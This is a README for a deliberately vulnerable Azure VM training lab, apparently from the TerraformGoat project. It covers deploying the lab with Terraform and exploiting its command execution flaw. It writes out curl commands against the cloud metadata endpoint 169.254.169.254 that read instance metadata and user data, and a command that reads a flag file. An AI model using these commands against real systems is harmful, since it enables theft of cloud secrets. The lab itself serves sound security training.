# Azure VM Command Execution Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the Azure VM command execution vulnerability environment.

After building the environment with Terraform, users can obtain metadata and user data and other information on VM through the command execution vulnerabilities.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/azure/vm/vm_command_execution
```

Use the `az login` command for Azure identity authentication, and follow the prompts to authenticate.

```shell
az login
```

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

After the environment is set up, You can see the access address of the scenario at Outputs, then access to the browser.

> Because the scenario takes some time to build, if your browser cannot access this site, you can wait a few minutes and access it again.

## Vulnerability Utilization

On VM with command execution vulnerabilities, we can use command execution to get VM metadata, user data and other information.

read metadata

```shell
curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-05-01 | python -m json.tool
```

![img](../../../images/1652094112.png)

read user data

> The premise is that the target has been configured with user data.

```shell
curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 --decode
```

![img](../../../images/1652094186.png)

In the user data information, you can see that there is a flag file in the root directory of the scenario, try to use  command execution to read this file.

```shell
cat /flag69152201.txt
```

![img](../../../images/1652094243.png)

Successfully read the flag file.

## Destroy the environment

```shell
terraform destroy
```
